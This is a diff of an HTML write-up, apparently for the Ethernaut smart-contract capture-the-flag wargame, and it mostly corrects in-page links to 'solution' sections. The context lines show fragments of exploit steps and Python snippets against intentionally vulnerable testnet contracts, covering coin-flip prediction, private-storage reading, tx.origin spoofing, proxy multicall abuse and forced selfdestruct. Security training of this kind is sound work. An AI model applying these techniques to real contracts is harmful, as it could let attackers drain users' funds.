@@ -318,7 +318,7 @@ bool side = coinFlip == 1 ? true : false;
 }
 </code></pre>
 <h3 id="how-i-did-it-1">How I did it</h3>
-<p>I did exactly what I described in the <a href="#solution">solution section</a>, but I inherited from Ownable to create the <code>CoinFlipAttack</code> contract as a way to restrict calling the <code>callFlip()</code> function only from the deployer of the attacker contract. After coding the contract I did the following steps:</p>
+<p>I did exactly what I described in the <a href="#solution-1">solution section</a>, but I inherited from Ownable to create the <code>CoinFlipAttack</code> contract as a way to restrict calling the <code>callFlip()</code> function only from the deployer of the attacker contract. After coding the contract I did the following steps:</p>
 <ol>
 <li>Deploy (at: <code>0xA8834Cc6c91bf94d4FB32D72815C2011CC1c2e15</code>) the attacker contract which I labeled <code>CoinFlipAttack.sol</code></li>
 </ol>
@@ -707,7 +707,7 @@ bytes32[3] private data;
 </code></pre>
 <p>So then after acquiring this, all that needs to be done is simply pass it as parameter to <code>unlock()</code>, which will cause <code>locked</code> to become false.</p>
 <h3 id="how-i-did-it-10">How I did it</h3>
-<p>Exactly as I described in <a href="#solution">solution</a>:</p>
+<p>Exactly as I described in <a href="#solution-10">solution</a>:</p>
 <ol>
 <li>Get the first 16 bytes of the data in the 5th storage position of the contract instance.</li>
 </ol>
@@ -799,7 +799,7 @@ bytes32[3] private data;
 }
 </code></pre>
 <ol start="2">
-<li>Modify my address (the <code>tx.origin</code>, <code>0x98bCCA1C6023e3F851090e079030da43d9F229d1</code>) in order to pass the third check, in this case I used <code>0x0000000000000000000000000000000A000029d1</code>. This will pass all checks as described in <a href="#solution">solution</a>.</li>
+<li>Modify my address (the <code>tx.origin</code>, <code>0x98bCCA1C6023e3F851090e079030da43d9F229d1</code>) in order to pass the third check, in this case I used <code>0x0000000000000000000000000000000A000029d1</code>. This will pass all checks as described in <a href="#solution-11">solution</a>.</li>
 </ol>
 <pre class=" language-python"><code class="prism  language-python">modified_tx_origin <span class="token operator">=</span> f<span class="token string">"0x{'0'*31}A0000{acc.address[-4:]}"</span>
 </code></pre>
@@ -969,7 +969,7 @@ address public owner;
 </ol>
 <h3 id="how-i-did-it-14">How I did it</h3>
 <ol>
-<li>Code and deploy (at: <code>0x5E51EE439b501d7e39261Df8C437dA19a28F651D</code>) the attacker contract as described in <a href="#solution">solution</a></li>
+<li>Code and deploy (at: <code>0x5E51EE439b501d7e39261Df8C437dA19a28F651D</code>) the attacker contract as described in <a href="#solution-14">solution</a></li>
 </ol>
 <pre class=" language-python"><code class="prism  language-python">pattack <span class="token operator">=</span> PreservationAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>preservation<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
 </code></pre>
@@ -1013,7 +1013,7 @@ address public owner;
 <p>With this information, all we have to do now is call the <code>destroy()</code> function in the SimpleToken contract and direct the funds within it to any address in order to mark the exercise as completed.</p>
 <h3 id="how-i-did-it-15">How I did it</h3>
 <ol>
-<li>Once we have these two details (deployer address, nonce) as I described in <a href="#solution">solution</a>, we can code a function in python (or directly in solidity) to obtain the address. As a resourceful developer, even though I know how to compute this, I still decided to go and find a ready made solution in StackExchange in order to skip this:</li>
+<li>Once we have these two details (deployer address, nonce) as I described in <a href="#solution-15">solution</a>, we can code a function in python (or directly in solidity) to obtain the address. As a resourceful developer, even though I know how to compute this, I still decided to go and find a ready made solution in StackExchange in order to skip this:</li>
 </ol>
 <pre class=" language-python"><code class="prism  language-python"><span class="token comment"># compute address of a given contract to be deployed from</span>
 <span class="token comment"># the deployer address + nonce, as stated in the Section 7 </span>
@@ -1069,12 +1069,12 @@ address public owner;
 <ul>
 <li>Initialization code (can be of any length)</li>
 </ul>
-<pre class=" language-assembly"><code class="prism  language-assembly">CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID
+<pre><code>CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID
 </code></pre>
 <ul>
 <li>Runtime code (has to have a length of <em>at most</em> 10 opcodes)</li>
 </ul>
-<pre class=" language-assembly"><code class="prism  language-assembly">PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN 
+<pre><code>PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN 
 </code></pre>
 <p>Here’s the bytecode as returned by the Remix IDE after compiling the Yul contract I coded to solve this:</p>
 <pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span>
@@ -1188,7 +1188,7 @@ object "MagicNumberSolver" {
 <li>Using this resulting value in <code>revise()</code> as the <code>i</code> (index) of the array <code>codex</code> to modify and <code>_content</code> as our address.</li>
 </ol>
 <h3 id="how-i-did-it-17">How I did it</h3>
-<p><em>Exactly</em> as described in <a href="#solution">solution</a>, but using my local setup in brownie:</p>
+<p><em>Exactly</em> as described in <a href="#solu">solution</a>, but using my local setup in brownie:</p>
 <ol>
 <li>Call <code>make_contact()</code></li>
 </ol>
@@ -1566,7 +1566,7 @@ balance_assertion <span class="token operator">=</span> <span class="token punct
 </li>
 </ol>
 <h3 id="how-i-did-it-21">How I did it</h3>
-<p>Exactly as described in <a href="#solution">solution</a>.</p>
+<p>Exactly as described in <a href="#solution-21">solution</a>.</p>
 <ol>
 <li>Code and deploy a new ERC20 token (at: <code>0xc27a45c6D84F6AB7aAFECFB82d0853064e288261</code>)</li>
 </ol>
@@ -1655,7 +1655,7 @@ balance_assertion <span class="token operator">=</span> balanceTK1 <span class="
 </li>
 </ol>
 <h3 id="how-i-did-it-22">How I did it</h3>
-<p>As described in <a href="#solution">solution</a>, but with a few resourceful changes in order to simplify the python code.</p>
+<p>As described in <a href="#solution-22">solution</a>, but with a few resourceful changes in order to simplify the python code.</p>
 <ol>
 <li>Get the position in the proxy contract’s storage which contains the address of the implementation contract. I do this in order to be able to encode the calls to certain methods in this contract, which I could technically do manually by constructing a short JSON and encoding it as ABI, but using the contract code instance is easier. I think it’s also possible to deploy an instance of the PuzzleWallet contract in order to do it.</li>
 </ol>
@@ -1682,7 +1682,7 @@ acc<span class="token punctuation">.</span>transfer<span class="token punctuatio
 </code></pre>
 <p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xfbc79616c75d96e8a0d176b88197521a18b688bfc6286f01fb904335300c56c5">https://rinkeby.etherscan.io/tx/0xfbc79616c75d96e8a0d176b88197521a18b688bfc6286f01fb904335300c56c5</a></p>
 <ol start="5">
-<li>Create the multicall bundled transaction and call <code>multicall()</code> as specified in <a href="#solution">solution</a> step 3.</li>
+<li>Create the multicall bundled transaction and call <code>multicall()</code> as specified in <a href="#solution-22">solution</a> step 3.</li>
 </ol>
 <pre class=" language-python"><code class="prism  language-python"><span class="token comment"># multicall tx data</span>
 deposit_data <span class="token operator">=</span> puzzlewallet<span class="token punctuation">.</span>deposit<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -1765,7 +1765,7 @@ eg<span class="token punctuation">.</span>initialize<span class="token punctuati
 be <span class="token operator">=</span> BombEngine<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
 </code></pre>
 <ol start="4">
-<li>Call <code>UpgradeToAndCall()</code> in the Engine implementation contract as described in <a href="#solution">solution</a>.</li>
+<li>Call <code>UpgradeToAndCall()</code> in the Engine implementation contract as described in <a href="#solution-23">solution</a>.</li>
 </ol>
 <pre class=" language-python"><code class="prism  language-python"><span class="token comment"># call upgradeToAndCall() to selfdestruct the Engine implementation contract</span>
 selfdestruct_call <span class="token operator">=</span> be<span class="token punctuation">.</span>boom<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span><span class="token punctuation">)</span>
